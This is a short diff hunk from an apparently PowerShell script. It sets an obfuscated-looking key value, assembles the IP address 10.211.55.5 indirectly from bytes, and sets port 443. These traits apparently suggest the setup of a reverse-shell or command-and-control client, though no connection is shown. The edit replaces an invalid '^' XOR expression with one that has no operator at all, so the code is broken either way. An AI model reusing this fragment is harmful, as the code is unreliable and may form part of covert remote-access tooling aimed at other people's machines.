@@ -4,7 +4,7 @@
 Add-Type -AssemblyName System.Security.Cryptography
 
  
-$SSSX = 0x55 ^ 0xAA 
+$SSSX = 0x55  0xAA 
 $IP = [System.BitConverter]::ToString([byte[]]@(10, 211, 55, 5)).Replace("-", "")
 $P = 443
 
